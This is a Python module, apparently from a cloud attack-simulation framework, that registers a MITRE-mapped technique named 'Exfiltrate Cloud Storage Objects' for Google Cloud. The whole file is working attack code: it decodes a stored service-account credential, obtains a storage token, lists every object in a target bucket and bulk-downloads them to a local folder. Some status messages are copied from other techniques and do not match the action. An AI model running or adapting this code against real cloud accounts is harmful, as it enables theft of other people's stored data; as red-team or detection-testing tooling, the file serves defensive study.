from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import json
import base64
import time
import hashlib
# from google.auth.exceptions import RefreshError
from core.gcp.gcp_access import GCPAccess
from google.cloud import storage
from google.cloud.storage import transfer_manager
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request



@TechniqueRegistry.register
class GCPExfiltrateCloudStorageObjects(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1223",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        super().__init__("Exfiltrate Cloud Storage Objects", "Exfiltrate Cloud Storage object of buckets in the targeted GCP account", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            name: str = kwargs['name']
            path: str = kwargs['path']
            manager = GCPAccess()
            current_access = manager.get_current_access()
            loaded_credential = json.loads(base64.b64decode(current_access["credential"]))
            scopes = [
                "https://www.googleapis.com/auth/devstorage.read_only"
            ]
            request = Request()
            credential = ServiceAccountCredentials.from_service_account_info(loaded_credential, scopes=scopes)
            credential.refresh(request=request)
            
            client = storage.Client(credentials=credential)

            bucket = client.bucket(bucket_name=name)

            
            objects_path = []

            if path == "":
                all_blobs = [blob.name for blob in bucket.list_blobs()]
                for blob in all_blobs:
                    objects_path.append(blob)
            else :
                objects_path.append(path)

            current_time = str(time.time())

            hash_object = hashlib.sha256(current_time.encode())
            dir_name = hash_object.hexdigest()[:10]

            destination_path = "./output/cloud_storage_bucket_download/"+  dir_name

            transfer_manager.download_many_to_path(bucket=bucket, blob_names=objects_path, destination_directory=destination_path)
            
            return ExecutionStatus.SUCCESS, {
                "value": {
                    "destination": destination_path,

                },
                "message": f"Successfully established access to target GCP tenant"
            }
        
        except ValueError as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to enumerate cloud storage buckets. The project not specified on selected credential or no current saved credential"
            }
        
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to establish access to GCP"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "name": {"type": "str", "required": True, "default": None, "name": "Name", "input_field_type" : "text"},
            "path": {"type": "str", "required": False, "default": None, "name": "Path", "input_field_type" : "textarea"}
        }